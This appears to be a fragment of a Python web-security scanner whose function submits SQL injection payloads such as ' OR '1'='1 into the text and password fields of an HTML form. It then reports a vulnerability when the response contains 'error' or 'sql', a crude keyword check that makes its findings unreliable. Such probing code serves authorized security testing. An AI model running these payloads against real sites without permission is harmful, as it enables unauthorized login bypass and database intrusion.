import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

def test_sql_injection(url, form):
    payloads = ["' OR '1'='1", "' OR 'a'='a", "' OR '1'='1'; --"]
    for payload in payloads:
        data = {}
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', '').lower()
            if input_type == 'text' or input_type == 'password':
                data[input_name] = payload
        response = requests.post(url, data=data)
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(Fore.RED + f"[!] SQL Injection vulnerability found with payload: {payload}" + Style.RESET_ALL)